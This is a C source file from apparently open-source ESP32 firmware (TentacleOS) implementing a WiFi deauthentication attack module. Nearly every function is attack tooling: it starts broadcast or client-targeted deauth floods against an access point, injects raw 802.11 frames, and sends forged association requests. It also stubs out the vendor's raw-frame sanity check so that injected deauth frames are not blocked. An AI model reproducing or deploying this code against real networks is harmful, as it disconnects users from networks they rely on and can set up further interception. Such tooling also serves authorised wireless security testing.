// Copyright (c) 2025 HIGH CODE LLC
//
// TentacleOS is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// (at your option) any later version.
//
// TentacleOS is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with TentacleOS. If not, see <https://www.gnu.org/licenses/>.

#include "wifi_deauther.h"

#include "led_control.h"

#include <string.h>

#include "esp_log.h"

#include "spi_bridge.h"
#include "spi_session.h"

static const char *TAG = "WIFI_DEAUTHER";

static uint32_t s_session_id = SPI_SESSION_INVALID_ID;

bool wifi_deauther_start(const wifi_ap_record_t *ap_record,
                         wifi_deauther_frame_type_t type,
                         bool is_broadcast) {
  ESP_LOGI(TAG, "Deauth attack started");
  uint8_t payload[14];
  memcpy(payload, ap_record->bssid, 6);
  memset(payload + 6, is_broadcast ? 0xFF : 0x00, 6);
  payload[12] = (uint8_t)type;
  payload[13] = ap_record->primary;
  s_session_id = spi_session_start(SPI_ID_WIFI_APP_DEAUTHER, payload, sizeof(payload), NULL, NULL);
  bool ok = s_session_id != SPI_SESSION_INVALID_ID;
  ok ? led_signal_info() : led_signal_error();
  return ok;
}

bool wifi_deauther_start_targeted(const wifi_ap_record_t *ap_record,
                                  const uint8_t client_mac[6],
                                  wifi_deauther_frame_type_t type) {
  uint8_t payload[14];
  memcpy(payload, ap_record->bssid, 6);
  memcpy(payload + 6, client_mac, 6);
  payload[12] = (uint8_t)type;
  payload[13] = ap_record->primary;
  s_session_id = spi_session_start(SPI_ID_WIFI_APP_DEAUTHER, payload, sizeof(payload), NULL, NULL);
  bool ok = s_session_id != SPI_SESSION_INVALID_ID;
  ok ? led_signal_info() : led_signal_error();
  return ok;
}

void wifi_deauther_stop(void) {
  ESP_LOGI(TAG, "Deauth stopped");
  if (s_session_id != SPI_SESSION_INVALID_ID) {
    spi_session_stop(s_session_id);
    s_session_id = SPI_SESSION_INVALID_ID;
  }
}

bool wifi_deauther_is_running(void) {
  spi_header_t resp;
  uint8_t payload[1] = {0};
  if (spi_bridge_send_command(SPI_ID_WIFI_DEAUTH_STATUS, NULL, 0, &resp, payload, 1000) == ESP_OK) {
    return payload[0] != 0;
  }
  return false;
}

void wifi_deauther_send_deauth_frame(const wifi_ap_record_t *ap_record,
                                     wifi_deauther_frame_type_t type) {
  if (ap_record == NULL)
    return;
  uint8_t payload[8];
  memcpy(payload, ap_record->bssid, 6);
  payload[6] = (uint8_t)type;
  payload[7] = ap_record->primary;
  spi_bridge_send_command(
      SPI_ID_WIFI_DEAUTH_SEND_FRAME, payload, sizeof(payload), NULL, NULL, 2000);
}

void wifi_deauther_send_broadcast_deauth(const wifi_ap_record_t *ap_record,
                                         wifi_deauther_frame_type_t type) {
  if (ap_record == NULL)
    return;
  uint8_t payload[8];
  memcpy(payload, ap_record->bssid, 6);
  payload[6] = (uint8_t)type;
  payload[7] = ap_record->primary;
  spi_bridge_send_command(
      SPI_ID_WIFI_DEAUTH_SEND_BROADCAST, payload, sizeof(payload), NULL, NULL, 2000);
}

void wifi_deauther_send_raw_frame(const uint8_t *frame_buffer, int size) {
  if (frame_buffer == NULL || size <= 0 || size > SPI_MAX_PAYLOAD)
    return;
  spi_bridge_send_command(
      SPI_ID_WIFI_DEAUTH_SEND_RAW, frame_buffer, (uint8_t)size, NULL, NULL, 2000);
}

void wifi_deauther_send_association_request(const wifi_ap_record_t *ap_record) {
  if (ap_record == NULL)
    return;
  uint8_t payload[8 + 32];
  uint8_t ssid_len = (uint8_t)strnlen((const char *)ap_record->ssid, 32);
  memcpy(payload, ap_record->bssid, 6);
  payload[6] = ap_record->primary;
  payload[7] = ssid_len;
  memcpy(payload + 8, ap_record->ssid, ssid_len);
  spi_bridge_send_command(
      SPI_ID_WIFI_ASSOC_REQUEST, payload, (uint8_t)(8 + ssid_len), NULL, NULL, 2000);
}

int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
  return 0;
}
